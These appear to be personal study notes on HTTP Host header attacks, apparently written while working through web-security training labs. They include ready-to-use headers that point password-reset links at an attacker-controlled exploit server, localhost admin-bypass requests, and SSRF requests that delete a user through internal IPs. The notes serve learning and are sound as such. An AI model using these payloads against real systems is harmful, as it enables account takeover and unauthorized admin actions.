

HTTP host header help identify which back-end component the client want to communicate with 


#### approach

The best place to set this attack is in forgot my password

![[Pasted image 20250206100505.png]]

```
X-Forwarded-Host: exploit-server.com
X-Host: exploit-server.com
X-Forwarded-Server: exploit-server.com
Forwarded
```

#### virtual hosting

this could be multiple websites with a single owner, but it is also possible for websites with different owners to be hosted on a single, shared platform.
though each of these distinct websites will have a different domain name, they all share a common IP address with the server.


#### Routing traffic via an intermediary

all traffic between the client and servers is routed through an intermediary system.
This could be a simple load balancer or a reverse proxy server of some kind. This setup is especially prevalent in cases where clients access the website via a content delivery network (CDN). domain names resolve to a single IP address of the intermediary component.



testing for vulns:
- [ ] check for non numerical ports
- [ ] check for non secure subdomains `hacked-subdomain.vulnerable-website.com`
- [ ] check for duplicate host header
- [ ] supply absolute URL
- [ ] add a space 
- [ ] insert collab


# Host header authentication bypass
``` http
Host: localhost
```


# Admin panel from localhost only

```
GET /admin HTTP/1.1
Host: localhost
```
# Routing-based SSRF
```http
GET /admin/delete?csrf=MFvIFiH4PbBlyQt7aZCSailhhTDDkSWN&username=carlos HTTP/2
Host: 192.168.0.215
```



# SSRF via flawed request parsing

add absolute path 
```http
GET https://0a3b002f033675b4830f05fe0080002c.web-security-academy.net/admin/delete?csrf=5pqOzlkZrovRrIRbOQCikuuhJhSXbqGc&username=carlos HTTP/2
Host: 192.168.0.93
```


# Host validation bypass via connection state attack

adopts HTTP smuggling mechanism 1 request is valid the second request is in the internal network that are sent in the single connection group


```http
GET / HTTP/1.1
Host: 0af500d60304cc5780f58f6b007300d8.h1-web-security-academy.net

POST /admin/delete HTTP/1.1
Host: 192.168.0.1
```